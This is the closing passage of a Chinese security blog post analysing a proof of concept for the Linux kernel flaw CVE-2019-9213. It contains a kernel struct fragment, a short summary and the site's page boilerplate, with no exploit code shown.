class="title">vm_userfaultfd_ctx</span> <span class="title">vm_userfaultfd_ctx</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>This struct defines a memory VMM memory area. There is one of these per VM-area/task.  A VM area is any part of the process virtual memory space that has a special rule for the page-fault handlers (ie a shared library, the executable area etc).</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞的原因并不复杂，是<code>suid</code>程序引发的问题，但是一路分析过来却比较困难，因为对类似<code>vma</code>，<code>mm</code>等变量的了解不够，导致分析起来比较困难</p>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-04-02T02:02:02.933Z" itemprop="dateUpdated">2020-04-02 10:02:02</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2020/03/31/CVE-2019-9213-Poc分析/" target="_blank" rel="external">http://dayjun.top/2020/03/31/CVE-2019-9213-Poc分析/</a>
        
    </div>
    <footer>
        <a href="http://dayjun.top">
            <img src="/img/girl.jpg" alt="DaJun">
            DaJun
        </a>
    </footer>
</blockquote>

        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/">kernel</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/03/31/CVE-2019-9213-Poc分析/&title=《CVE-2019-9213 Poc分析》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/03/31/CVE-2019-9213-Poc分析/&title=《CVE-2019-9213 Poc分析》 — DaJun的Blog&source=看了许多关于这个漏洞的文章，这里进行一下自我总结
参考：https://cert.360.cn/report/detail?id=58e8387ec4c7..." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>



        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2020/04/01/Linux的pipe与fifo/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Linux的pipe与fifo</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2020/03/29/绕过2-24以后libc对vtable的检查/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">绕过2.24以后libc对vtable的检查</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Poc"><span class="post-toc-number">1.</span> <span class="post-toc-text">Poc</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#跟进分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">跟进分析</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#vma"><span class="post-toc-number">3.</span> <span class="post-toc-text">vma</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">4.</span> <span class="post-toc-text">总结</span></a></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>


</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="https://3nd.xyz/" target="_blank">3ND</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                DaJun &copy; 2019 - 2020
            </span>
        		
           	
           	<span>
           		<a href="http://www.beian.miit.gov.cn" target="_blank">苏ICP备19059861号</a>
           	</span>
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/03/31/CVE-2019-9213-Poc分析/&title=《CVE-2019-9213 Poc分析》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/03/31/CVE-2019-9213-Poc分析/&title=《CVE-2019-9213 Poc分析》 — DaJun的Blog&source=看了许多关于这个漏洞的文章，这里进行一下自我总结
参考：https://cert.360.cn/report/detail?id=58e8387ec4c7..." data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3aS47DIBBFUe9/0+5pBg2+r8BRgMsoiojNyaBUH64Lr/tjtb5v7fnc2fpVa+fkJUOGjGUZd3e1GOQbDu5/Rn+WDBkyDmCQENn/FTkKeSPfKUOGDBnp49LAPeu9MmTIkDF3Tx/zQwFXhgwZP8ngRWat60UAX6rFZciQsSCDH+77n1+Zb8iQIWMpxh2udEjAW288yP5zKhkyZGzN4AGOXIwg48xZAVeGDBnnMEauR/DrYqhZVrrAEbxMhgwZyzLSFlh63FmVJjqPDBkyDmCQ2JVe5BofXpK3y5Ah4wRGWmSmD00DOklGJ8wxZMiQsQgjLVDTIJg+kxe3MmTIOIfRf1ma0vEWW433cFlNhgwZWzPSB9UOl44fau0/GTJk7MdIR5LTxo0g0AdpogwZMrZmkFbaeOt/aDCJk1cZMmScwCAvrhWW6UGLGa4MGTIOY5A4Vrv+RZJIPjqVIUPGCQx+uOBKFk4r00K6iZQhQ8bWjDSZq7F5Wjnyd8iQIeM0Bm/i11LJWpH8EKxlyJBxAIM8eqRkvcIVjwdkyJBxAKM2XOyTeAlau6IhQ4aMExh3uHiymA4gh0aYMmTI2JqRJmr8KOQJvNkXXA6TIUPGpoy0EOWNtvSvSQPuUD0tQ4aMBRlB1Yub+2kiOK0WlyFDhgyc6vEmXW0w8ErAlSFDxhaM2uUwQk1JQwFXhgwZCzJIEfsGmO9/OI8MGTK2ZoyUjrPGnDwRHLpwJkOGjPUYf3XQQc9HNtY8AAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
    
    



<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>



    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '(～﹃～)~zZ';
                clearTimeout(titleTime);
            } else {
                document.title = '(￣▽￣)';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
</body>
</html>
